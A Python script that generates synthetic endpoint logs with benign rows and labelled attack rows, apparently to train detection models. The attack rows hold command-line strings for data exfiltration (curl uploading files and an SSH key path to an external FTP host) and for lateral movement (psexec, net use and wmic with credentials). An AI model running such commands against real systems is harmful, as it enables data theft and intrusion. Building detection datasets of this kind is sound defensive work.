"""
Synthetic Endpoint Log Generator
Run: python generate_endpoint_logs.py
Outputs: data/synthetic/endpoint_logs.csv (~50,000 rows)
"""
import pandas as pd
import numpy as np
import random
from faker import Faker
from datetime import datetime, timedelta
import os

fake = Faker()
random.seed(42)
np.random.seed(42)

os.makedirs('data/synthetic', exist_ok=True)

# ─── Config ────────────────────────────────────────────────────────────────

START_TIME = datetime(2025, 1, 1, 0, 0, 0)
TOTAL_ROWS = 50_000

BENIGN_RATIO = 0.70
BRUTE_RATIO = 0.10
LATERAL_RATIO = 0.10
EXFIL_RATIO = 0.05
C2_RATIO = 0.05

INTERNAL_IPS = [f"10.0.{random.randint(0,5)}.{random.randint(1,254)}" for _ in range(50)]
EXTERNAL_IPS = [fake.ipv4_public() for _ in range(30)]
HOSTNAMES = [f"WORKSTATION-{i:03d}" for i in range(1, 30)] + \
            [f"SERVER-{i:02d}" for i in range(1, 10)]
REGULAR_USERS = [fake.user_name() for _ in range(40)]
ADMIN_USERS = ['admin', 'sysadmin', 'backup_user', 'administrator', 'root']

# ─── Row generators ────────────────────────────────────────────────────────

def random_ts(start=START_TIME, days=7):
    return start + timedelta(
        seconds=random.randint(0, days * 86400)
    )

def benign_row(ts=None):
    ts = ts or random_ts()
    proc = random.choice([
        'chrome.exe', 'svchost.exe', 'python.exe', 'bash', 'code.exe',
        'explorer.exe', 'winword.exe', 'outlook.exe', 'systemd', 'cron',
        'node.exe', 'java', 'postgres', 'nginx'
    ])
    parent = random.choice(['explorer.exe', 'bash', 'systemd', 'services.exe', 'cron'])
    user = random.choice(REGULAR_USERS)
    return {
        'timestamp': ts,
        'hostname': random.choice(HOSTNAMES),
        'username': user,
        'process_name': proc,
        'parent_process': parent,
        'parent_pid': random.randint(100, 9999),
        'child_pid': random.randint(1000, 65000),
        'cmdline': f'{proc} --normal-flag',
        'file_path': random.choice([
            f'C:\\Windows\\System32\\{proc}',
            f'C:\\Program Files\\App\\{proc}',
            f'/usr/bin/{proc}',
            f'/home/{user}/.local/{proc}'
        ]),
        'registry_key': random.choice([
            'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion',
            'HKCU\\Software\\Google\\Chrome',
            None
        ]),
        'event_type': random.choice(['process_start', 'file_access', 'network_connect', 'registry_read']),
        'src_ip': random.choice(INTERNAL_IPS),
        'dst_ip': random.choice(INTERNAL_IPS),
        'dst_port': random.choice([80, 443, 8080, 5432, 3306, 445]),
        'bytes_sent': random.randint(100, 50_000),
        'label': 0,
        'attack_cat': 'Normal',
        'is_fp_candidate': 0,
        'attack_group_id': None
    }

def admin_bulk_transfer_row(ts=None):
    """False positive: admin bulk file transfer"""
    ts = ts or random_ts()
    row = benign_row(ts)
    row.update({
        'username': random.choice(ADMIN_USERS),
        'process_name': random.choice(['robocopy', 'rsync', 'tar', 'rclone']),
        'parent_process': 'bash',
        'cmdline': 'robocopy C:\\Data \\\\backup-server\\archive /MIR',
        'file_path': random.choice(['C:\\Data\\archive.zip', '/mnt/backup/dump.tar.gz']),
        'event_type': 'file_transfer',
        'dst_ip': '10.0.0.50',  # internal backup server
        'dst_port': 445,
        'bytes_sent': random.randint(500_000_000, 5_000_000_000),  # 500MB - 5GB
        'is_fp_candidate': 1,
        'label': 0,
        'attack_cat': 'Normal'
    })
    return row

def brute_force_rows(group_id):
    """Burst of failed logins from same IP"""
    src_ip = random.choice(EXTERNAL_IPS)
    target = random.choice(HOSTNAMES)
    ts = random_ts()
    rows = []
    for i in range(random.randint(8, 20)):
        rows.append({
            'timestamp': ts + timedelta(seconds=i * random.uniform(1, 5)),
            'hostname': target,
            'username': random.choice(['root', 'admin', 'administrator', 'user']),
            'process_name': random.choice(['sshd', 'winlogon', 'lsass']),
            'parent_process': 'systemd',
            'parent_pid': 1,
            'child_pid': random.randint(1000, 65000),
            'cmdline': f'ssh -l root {src_ip}',
            'file_path': '/var/log/auth.log',
            'registry_key': None,
            'event_type': 'failed_login',
            'src_ip': src_ip,
            'dst_ip': random.choice(INTERNAL_IPS),
            'dst_port': random.choice([22, 3389, 445, 1433]),
            'bytes_sent': random.randint(200, 1000),
            'label': 1,
            'attack_cat': 'Brute Force',
            'is_fp_candidate': 0,
            'attack_group_id': group_id
        })
    return rows

def lateral_movement_rows(group_id):
    """Suspicious process spawn chains after initial access"""
    compromised_host = random.choice(HOSTNAMES[:10])
    pivot_ip = random.choice(INTERNAL_IPS)
    ts = random_ts()
    chains = [
        ('cmd.exe', 'explorer.exe', 'cmd.exe --hidden'),
        ('powershell.exe', 'cmd.exe', 'powershell -EncodedCommand aQBmAA=='),
        ('net.exe', 'powershell.exe', 'net use \\\\SERVER-01\\IPC$ /user:admin password'),
        ('psexec.exe', 'cmd.exe', 'psexec \\\\SERVER-02 -u admin -p pass cmd'),
        ('wmic.exe', 'cmd.exe', 'wmic /node:10.0.1.5 process call create "cmd.exe"'),
    ]
    rows = []
    for i, (proc, parent, cmd) in enumerate(chains):
        rows.append({
            'timestamp': ts + timedelta(minutes=i * 2),
            'hostname': compromised_host,
            'username': random.choice(REGULAR_USERS),
            'process_name': proc,
            'parent_process': parent,
            'parent_pid': random.randint(100, 9999),
            'child_pid': random.randint(1000, 65000),
            'cmdline': cmd,
            'file_path': f'C:\\Windows\\System32\\{proc}',
            'registry_key': 'HKLM\\SAM\\SAM\\Domains\\Account',
            'event_type': 'process_start',
            'src_ip': random.choice(INTERNAL_IPS),
            'dst_ip': pivot_ip,
            'dst_port': random.choice([445, 135, 3389]),
            'bytes_sent': random.randint(1000, 50_000),
            'label': 1,
            'attack_cat': 'Lateral Movement',
            'is_fp_candidate': 0,
            'attack_group_id': group_id
        })
    return rows

def exfil_rows(group_id):
    """Large outbound data transfers to external IPs"""
    external_ip = random.choice(EXTERNAL_IPS)
    ts = random_ts()
    rows = []
    for i in range(random.randint(3, 8)):
        rows.append({
            'timestamp': ts + timedelta(minutes=i * 10),
            'hostname': random.choice(HOSTNAMES),
            'username': random.choice(REGULAR_USERS),
            'process_name': random.choice(['curl', 'wget', 'ftp', 'rclone', 'nc']),
            'parent_process': 'bash',
            'parent_pid': random.randint(100, 9999),
            'child_pid': random.randint(1000, 65000),
            'cmdline': f'curl -T /data/sensitive.zip ftp://{external_ip}/drop/',
            'file_path': random.choice([
                '/data/sensitive.zip', 'C:\\Users\\Documents\\confidential.tar.gz',
                '/home/user/.ssh/id_rsa', 'C:\\backup\\database_dump.sql'
            ]),
            'registry_key': None,
            'event_type': 'file_transfer',
            'src_ip': random.choice(INTERNAL_IPS),
            'dst_ip': external_ip,
            'dst_port': random.choice([21, 443, 8443, 4444]),
            'bytes_sent': random.randint(100_000_000, 2_000_000_000),  # 100MB-2GB
            'label': 1,
            'attack_cat': 'Data Exfil',
            'is_fp_candidate': 0,
            'attack_group_id': group_id
        })
    return rows

def c2_beacon_rows(group_id):
    """Periodic beaconing to same external IP at regular intervals"""
    c2_ip = random.choice(EXTERNAL_IPS)
    interval_s = random.randint(30, 120)
    jitter_pct = random.uniform(1, 4)  # <5% jitter = suspicious
    ts = random_ts()
    rows = []
    for i in range(random.randint(15, 30)):
        actual_interval = interval_s * (1 + random.uniform(-jitter_pct/100, jitter_pct/100))
        ts_beacon = ts + timedelta(seconds=i * actual_interval)
        rows.append({
            'timestamp': ts_beacon,
            'hostname': random.choice(HOSTNAMES),
            'username': 'SYSTEM',
            'process_name': random.choice(['svchost.exe', 'explorer.exe', 'iexplore.exe']),
            'parent_process': 'services.exe',
            'parent_pid': 400,
            'child_pid': random.randint(1000, 65000),
            'cmdline': 'svchost.exe -k NetworkService',
            'file_path': 'C:\\Windows\\System32\\svchost.exe',
            'registry_key': None,
            'event_type': 'network_connect',
            'src_ip': random.choice(INTERNAL_IPS),
            'dst_ip': c2_ip,
            'dst_port': random.choice([443, 80, 8080, 4444]),
            'bytes_sent': random.randint(100, 2000),
            'label': 1,
            'attack_cat': 'C2 Beaconing',
            'is_fp_candidate': 0,
            'attack_group_id': group_id
        })
    return rows

# ─── Generate all rows ─────────────────────────────────────────────────────

rows = []

# Benign traffic
n_benign = int(TOTAL_ROWS * BENIGN_RATIO) - 500  # -500 for FP admin rows
for _ in range(n_benign):
    rows.append(benign_row())

# False positive admin bulk transfers
for _ in range(500):
    rows.append(admin_bulk_transfer_row())

# Brute force attacks
group = 0
while sum(1 for r in rows if r['attack_cat'] == 'Brute Force') < int(TOTAL_ROWS * BRUTE_RATIO):
    rows.extend(brute_force_rows(f'BF_{group}'))
    group += 1

# Lateral movement
group = 0
while sum(1 for r in rows if r['attack_cat'] == 'Lateral Movement') < int(TOTAL_ROWS * LATERAL_RATIO):
    rows.extend(lateral_movement_rows(f'LM_{group}'))
    group += 1

# Data exfiltration
group = 0
while sum(1 for r in rows if r['attack_cat'] == 'Data Exfil') < int(TOTAL_ROWS * EXFIL_RATIO):
    rows.extend(exfil_rows(f'EX_{group}'))
    group += 1

# C2 Beaconing
group = 0
while sum(1 for r in rows if r['attack_cat'] == 'C2 Beaconing') < int(TOTAL_ROWS * C2_RATIO):
    rows.extend(c2_beacon_rows(f'C2_{group}'))
    group += 1

# Trim and shuffle
random.shuffle(rows)
rows = rows[:TOTAL_ROWS]

df = pd.DataFrame(rows)
df = df.sort_values('timestamp').reset_index(drop=True)

out_path = 'data/synthetic/endpoint_logs.csv'
df.to_csv(out_path, index=False)

print(f"✅ Generated {len(df)} endpoint log rows → {out_path}")
print("\nClass distribution:")
print(df['attack_cat'].value_counts())
print(f"\nFalse positive candidates: {df['is_fp_candidate'].sum()}")
